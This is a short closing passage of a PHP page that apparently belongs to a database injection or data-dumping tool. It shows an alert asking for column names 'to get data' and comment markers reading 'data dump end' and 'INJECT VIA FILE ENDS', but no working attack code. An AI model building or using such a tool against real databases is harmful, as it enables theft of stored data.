									<?php 
								}
								else
								{
									echo '<script>alert("Please enter column(s) name to get data");</script>';
								}
					}					
///////////////////
//////data dump  end
//////////////////	
 //------------------------------------------------INJECT VIA FILE ENDS------------------------------------------------------
	} 
?>
</div>
</div>
</body>